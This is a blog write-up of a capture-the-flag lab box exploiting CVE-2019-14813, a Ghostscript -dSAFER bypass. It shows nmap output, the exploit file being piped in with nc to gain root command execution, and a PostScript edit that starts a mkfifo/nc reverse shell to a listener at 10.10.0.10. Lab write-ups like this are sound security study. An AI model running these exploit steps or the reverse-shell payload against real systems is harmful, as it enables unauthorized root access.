---
layout: post
title: CVE-2019-14813 
feature-img: "assets/img/portfolio/CVE-2019-14813.png"
img: "assets/img/portfolio/CVE-2019-14813.png"
date: 18 May 2021
tags: [Lorem, Ipsum]
---




[CVE-2019-14813](https://echoctf.red/target/16)
![](/assets/images/CVE-2019-14813.png)

A flaw was found in ghostscript, versions 9.x before 9.28, in the setsystemparams procedure where it did not properly secure its privileged calls, enabling scripts to bypass -dSAFER restrictions. A specially crafted PostScript file could disable security protection and then have access to the file system, or execute arbitrary commands.


References:

[CVE-2019-14813](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14813)

[Ghostscript FIX Commit](http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=885444fcbe10dc42787ecb76686c8ee4dd33bf3)

[Ghostscript Bugzilla - Bug 700317](https://bugs.ghostscript.com/show_bug.cgi?id=700317)

---

### Enumartion



nmap -sC -sV -p- 10.0.40.0

```
PORT      STATE    SERVICE VERSION
12345/tcp open     netbus?
| fingerprint-strings:
|   Help:
|     GPL Ghostscript 9.26 (2018-11-20)
|     Copyright (C) 2018 Artifex Software, Inc. All rights reserved.
|     This software comes with NO WARRANTY: see the file PUBLIC for details.
|     GS>Error: /undefined in HELP
|     Operand stack:
|     Execution stack:
|     %interp_exit .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval-- --nostringval-- %loop_continue --nostringval-- --nostringval-- false 1 %stopped_push .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval--
|     Dictionary stack:
|     --dict:957/1684(ro)(G)-- --dict:0/20(G)-- --dict:78/200(L)--
|     Current allocation mode is local
|     Last OS error: No such file or directory
|     Current file position is 5
|   NULL:
|     GPL Ghostscript 9.26 (2018-11-20)
|     Copyright (C) 2018 Artifex Software, Inc. All rights reserved.
|     This software comes with NO WARRANTY: see the file PUBLIC for details.
|   OfficeScan:
|     GPL Ghostscript 9.26 (2018-11-20)
|     Copyright (C) 2018 Artifex Software, Inc. All rights reserved.
|     This software comes with NO WARRANTY: see the file PUBLIC for details.
|     GS>Error: /undefined in GET
|     Operand stack:
|     Execution stack:
|     %interp_exit .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval-- --nostringval-- %loop_continue --nostringval-- --nostringval-- false 1 %stopped_push .runexec2 --nostringval-- --nostringval-- --nostringval-- 2 %stopped_push --nostringval--
|     Dictionary stack:
|     --dict:957/1684(ro)(G)-- --dict:0/20(G)-- --dict:78/200(L)--
|     Current allocation mode is local
|     Last OS error: No such file or directory
|     Current file position is 4
|_    GS>GS>
42132/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?


```

### vulnerability

CVE-2019-14813


### Exploit 

using refrences and google:

[ghost_script_exploit](https://github.com/hhc0null/GhostRule/blob/master/ghostrule3.ps)

let connect via telnet:

telnet 10.0.40.0  12345

```
telnet 10.0.40.0  12345 
                                                                       1 ⨯ 2 ⚙
Trying 10.0.40.0...
Connected to 10.0.40.0.
Escape character is '^]'.
GPL Ghostscript 9.26 (2018-11-20)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.
GS>


```

we connected to Ghostscript. 

### Rce

[ghost_script_exploit](https://github.com/hhc0null/GhostRule/blob/master/ghostrule3.ps)

pasting all file content to terminal.

```
cat ghostrule3.ps | nc 10.0.40.0 12345                                                             2 ⚙
GPL Ghostscript 9.26 (2018-11-20)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.
GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS>GS<1>GS<2>GS<3>=============================================================================
=     Safer Mode Bypass by `.forceput` Exposure from `setsystemparams`      =
=============================================================================
GS>GS>[*] Obtaining .forceput operator from setsystemparams operator...
GS>GS>GS>GS>GS>GS>GS>GS<1>GS<2>GS<3>GS>[+] A candidate for .forceput operator found!
GS>GS>[*] Attempting sanity check with the candidate for .forceput operator...
GS>GS<1>GS>GS>GS>GS>GS>[+] Successfully got .forceput operator!
GS>GS>[*] Overwriting several flags to escape from Safer Mode...
GS>GS>GS>GS>GS>GS>GS>GS>GS>[+] Successfully escaped from Safer Mode!
GS>GS>[*] Executing a shell command...
GS>root
GS>
```
as we can see, we can execute commadns, and got bonus, i can do it as root. 

so let get shell + and root.

### Privilege escalation

let replace the id to rev_shell script. 

```

(Executing a shell command...) info
(whoami) osexec print
quit

```

to 

```

(Executing a shell command...) info
(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.10 4444 >/tmp/f) osexec print
quit
```

[generate shells](https://www.revshells.com/)

![](/assets/img/p_sec_cve14813.png)
